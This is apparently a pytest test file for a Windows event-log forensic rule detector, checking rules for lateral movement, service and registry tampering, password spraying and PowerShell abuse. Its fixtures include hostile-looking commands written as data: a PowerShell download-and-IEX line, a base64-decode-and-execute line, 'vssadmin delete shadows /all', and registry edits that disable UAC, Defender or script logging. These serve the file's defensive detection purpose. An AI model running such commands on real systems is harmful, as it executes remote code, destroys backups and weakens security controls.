    ("security-registry-weakened", ev(4657, "Microsoft-Windows-Security-Auditing",
                                      ObjectName=r"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinDefend",
                                      ObjectValueName="Start", NewValue="2")),
    ("security-registry-weakened", ev(13, "Some-Other-Provider", TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows"
                                     r"\CurrentVersion\Policies\System\EnableLUA", Details="DWORD (0x00000000)")),
    ("system-time-changed", ev(4616, "Microsoft-Windows-Security-Auditing", ProcessName=r"C:\Windows\System32\svchost.exe")),
    ("security-service-stopped", ev(7036, "Service Control Manager", param1="Microsoft Defender Antivirus Service",
                                    param2="stopped")),
    ("security-service-stopped", ev(7040, "Service Control Manager", param1="Background Intelligent Transfer Service",
                                    param2="auto start", param3="disabled")),
    # lateral movement look-alikes (loop 58)
    ("ps-remote-session", ev(400, "PowerShell", Data="Available | None | HostName=ConsoleHost")),
    ("pth-ntlm-logon", ev(4624, "Microsoft-Windows-Security-Auditing", LogonType="3", AuthenticationPackageName="NTLM",
                          LogonProcessName="NtLmSsp", KeyLength="128", TargetUserName="bob", IpAddress="10.0.0.21")),
    ("pth-ntlm-logon", ev(4624, "Microsoft-Windows-Security-Auditing", LogonType="3", AuthenticationPackageName="NTLM",
                          LogonProcessName="NtLmSsp", KeyLength="0", TargetUserName="ANONYMOUS LOGON",
                          IpAddress="10.0.0.21")),
    ("rdp-inbound", ev(4624, "Microsoft-Windows-Security-Auditing", LogonType="3", IpAddress="10.0.0.66")),
    ("rdp-inbound", ev(4778, "Microsoft-Windows-Security-Auditing", ClientAddress="LOCAL")),
    ("rdp-inbound", ev(21, "Microsoft-Windows-WindowsUpdateClient", Address="10.0.0.66")),
    ("psexec-service-process", ev(1, ParentImage=r"C:\Windows\System32\services.exe",
                                  Image=r"C:\Windows\System32\svchost.exe")),
    ("smb-file-drop", ev(11, Image="System", TargetFilename=r"C:\Windows\System32\LogFiles\x.log")),
    ("admin-share-access", ev(5140, "Microsoft-Windows-Security-Auditing", ShareName=r"\\*\IPC$",
                              SubjectUserName="admin", IpAddress="10.0.0.66")),
    ("admin-share-access", ev(5140, "Microsoft-Windows-Security-Auditing", ShareName=r"\\*\C$",
                              SubjectUserName="WS-17$", IpAddress="10.0.0.17")),
    ("admin-share-cmd", ev(1, CommandLine=r"net use Z: \\fs01\shared /persistent:yes")),
    ("remote-exec-output-share", ev(1, CommandLine=r"cmd /c dir > C:\temp\listing.txt")),
    ("dcom-mmc", ev(1, Image=r"C:\Windows\System32\mmc.exe", CommandLine=r'"C:\Windows\system32\mmc.exe" compmgmt.msc')),
    ("remote-exec-script", ev(4104, "Microsoft-Windows-PowerShell",
                              ScriptBlockText="$xl = [type]::GetTypeFromProgID('Excel.Application')")),
    ("remote-access-registry", ev(13, TargetObject=r"HKLM\System\CurrentControlSet\Control\Terminal Server"
                                                   r"\fDenyTSConnections", Details="DWORD (0x00000001)")),
    ("rdp-hijack", ev(1, CommandLine="query session")),
    ("service-install-suspicious", ev(7045, "Service Control Manager",
                                      ImagePath=r'"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc')),
    ("remote-exec-tools", ev(1, CommandLine="schtasks /create /tn backup /tr C:\\b.bat /sc daily")),
]


@pytest.mark.parametrize("rule_id,event", HITS, ids=[h[0] for h in HITS])
def test_rule_fires(rule_id: str, event: ArtifactEvent) -> None:
    assert rule_matches(RULE[rule_id], event)


@pytest.mark.parametrize("rule_id,event", MISSES, ids=[f"not-{m[0]}" for m in MISSES])
def test_rule_ignores_look_alike(rule_id: str, event: ArtifactEvent) -> None:
    assert not rule_matches(RULE[rule_id], event)


def test_rule_ids_are_unique() -> None:
    assert len(RULE) == len(RULES)


def test_detector_reports_one_finding_per_rule_per_file_with_citation() -> None:
    events = [ev(1, row=i, CommandLine="vssadmin delete shadows /all") for i in range(1, 6)]
    findings = WindowsRuleDetector().detect(events, [], [])
    assert len(findings) == 1
    finding = findings[0]
    assert finding.citations[0].row == 1 and finding.citations[0].sha256 == SHA
    assert "4 more matching" in finding.recommendation
    assert all(item.split("=", 1)[0] in {"source", "artifact_id", "event_type"} for item in finding.evidence)


def test_event_without_citation_is_skipped() -> None:
    event = ev(1, CommandLine="vssadmin delete shadows /all")
    event.metadata.pop("source_sha256")
    assert WindowsRuleDetector().detect([event], [], []) == []


def test_parser_keeps_unnamed_data_and_userdata() -> None:
    from auto_forensics.artifacts import parse_evtx_xml_record

    ns = "http://schemas.microsoft.com/win/2004/08/events/event"
    sql = (f'<Event xmlns="{ns}"><System><Provider Name="MSSQLSERVER"/><EventID>15457</EventID></System>'
           "<EventData><Data>xp_cmdshell</Data><Data>0</Data><Data>1</Data></EventData></Event>")
    rdp = (f'<Event xmlns="{ns}"><System><Provider Name="TerminalServices"/><EventID>1149</EventID></System>'
           '<UserData><EventXML xmlns="Event_NS"><Param1>bob</Param1><Param3>127.0.0.1</Param3></EventXML>'
           "</UserData></Event>")
    first = parse_evtx_xml_record(sql, "a.evtx")
    second = parse_evtx_xml_record(rdp, "b.evtx")
    assert first is not None and first.metadata["Data"] == "xp_cmdshell | 0 | 1"
    assert second is not None and second.metadata["Param1"] == "bob" and second.metadata["Param3"] == "127.0.0.1"


def test_volume_rules_need_enough_events_and_accounts() -> None:
    detector = WindowsRuleDetector()
    sec = "Microsoft-Windows-Security-Auditing"
    few = [ev(4625, sec, row=i, TargetUserName="bob") for i in range(1, 5)]
    assert not [f for f in detector.detect(few, [], []) if f.title.startswith("Repeated failed")]
    def at(event: ArtifactEvent, second: int) -> ArtifactEvent:
        event.timestamp = f"2026-03-01T10:{second // 60:02d}:{second % 60:02d}.000Z"
        return event

    many = [at(ev(4625, sec, row=i, TargetUserName="bob"), i * 5) for i in range(1, 13)]
    found = [f for f in detector.detect(many, [], []) if f.title.startswith("Repeated failed")]
    assert len(found) == 1 and found[0].citations[0].row == 10
    assert not [f for f in detector.detect(many, [], []) if "spraying" in f.title]
    # The same twelve failures spread over a day are ordinary typos.
    spread = []
    for i in range(1, 13):
        event = ev(4625, sec, row=i, TargetUserName="bob")
        event.timestamp = f"2026-03-01T{8 + i % 10:02d}:{i:02d}:00.000Z"
        spread.append(event)
    assert not [f for f in detector.detect(spread, [], []) if f.title.startswith("Repeated failed")]
    spray = [at(ev(4625, sec, row=i, TargetUserName=f"user{i}", IpAddress="10.9.9.9"), i) for i in range(1, 7)]
    sprayed = [f for f in detector.detect(spray, [], []) if "spraying" in f.title]
    assert len(sprayed) == 1 and "6 accounts" in sprayed[0].recommendation
    no_time = [ev(4625, sec, row=i, TargetUserName=f"user{i}") for i in range(1, 7)]
    assert not [f for f in detector.detect(no_time, [], []) if "spraying" in f.title]


def test_recon_needs_a_burst_and_service_shell_needs_no_arguments() -> None:
    def at(event: ArtifactEvent, second: int) -> ArtifactEvent:
        event.timestamp = f"2026-03-01T10:00:{second:02d}.000Z"
        return event

    detector = WindowsRuleDetector()
    one = [at(ev(1, row=1, CommandLine="ipconfig /all", ParentImage=r"C:\Windows\System32\cmd.exe"), 1)]
    assert not [f for f in detector.detect(one, [], []) if "reconnaissance" in f.title]
    burst = [at(ev(1, row=i, CommandLine=cmd, ParentImage=r"C:\Windows\System32\cmd.exe"), i)
             for i, cmd in enumerate(["ipconfig /all", "systeminfo", "net share", "arp -a"], start=1)]
    assert [f for f in detector.detect(burst, [], []) if "reconnaissance" in f.title]
    rule = RULE["svchost-shell"]
    task = ev(1, ParentImage=r"C:\Windows\System32\svchost.exe", Image=r"C:\Windows\System32\cmd.exe",
              CommandLine=r"C:\Windows\system32\cmd.exe /c C:\scripts\nightly.bat")
    bare = ev(1, ParentImage=r"C:\Windows\System32\svchost.exe", Image=r"C:\Windows\System32\cmd.exe",
              CommandLine=r"C:\Windows\system32\cmd.exe")
    assert not rule_matches(rule, task) and rule_matches(rule, bare)


def test_registry_values_match_with_or_without_hex_padding() -> None:
    for details in ("DWORD (0x00000001)", "0x1"):
        assert rule_matches(RULE["office-macro-guard-off"], ev(13, TargetObject=r"HKU\S\Software\Microsoft\Office"
                                                                r"\16.0\Excel\Security\AccessVBOM", Details=details))
    for details in ("DWORD (0x00000000)", "0x0"):
        assert rule_matches(RULE["ps-logging-disabled"], ev(13, TargetObject=r"HKLM\SOFTWARE\Policies\Microsoft"
                                                             r"\Windows\PowerShell\ScriptBlockLogging"
                                                             r"\EnableScriptBlockLogging", Details=details))
    assert rule_matches(RULE["masquerade-renamed"], ev(1, Image=r"C:\Users\a\svc.exe", OriginalFileName="psexec.c"))


def test_script_block_combinations_match_in_any_order() -> None:
    rule = RULE["psh-scriptblock"]
    hit = "$s = (New-Object Net.WebClient).DownloadString('http://x/a'); IEX $s"
    assert rule_matches(rule, ev(4104, "Microsoft-Windows-PowerShell", ScriptBlockText=hit))
    decoded = "IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))"
    assert rule_matches(rule, ev(4104, "Microsoft-Windows-PowerShell", ScriptBlockText=decoded))
    plain = "Get-Service | Where-Object Status -eq 'Running'"
    assert not rule_matches(rule, ev(4104, "Microsoft-Windows-PowerShell", ScriptBlockText=plain))
